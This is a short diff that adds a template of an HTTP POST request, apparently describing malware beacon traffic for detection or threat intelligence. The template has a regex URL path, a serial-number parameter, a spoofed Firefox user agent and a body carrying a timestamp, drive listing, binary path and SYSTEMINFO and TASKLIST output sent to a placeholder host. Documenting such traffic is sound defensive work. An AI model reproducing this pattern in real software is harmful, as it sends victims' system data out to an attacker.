@@ -1,0 +1,19 @@
+POST (\/[a-zA-Z0-9\-\_\^\.]*){3}\.(php|dat)?fort=<SerialNumber_C> HTTP/1.0
+
+Connection: keep-alive
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: xxxx
+
+Host: <ip_address>
+
+Accept: text/html, */*
+
+Accept-Encoding: identity
+
+User-Agent: Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1
+
+pol=MM/DD/YYYY%20HH:MM:SS%20(AM|PM)%0D%0A<DriveListing>%0D%0A%0D%0A<Path_to_the_binary>%0D%0A%0D%0A<SYSTEMINFO & TASKLIST output>
+
+[...]
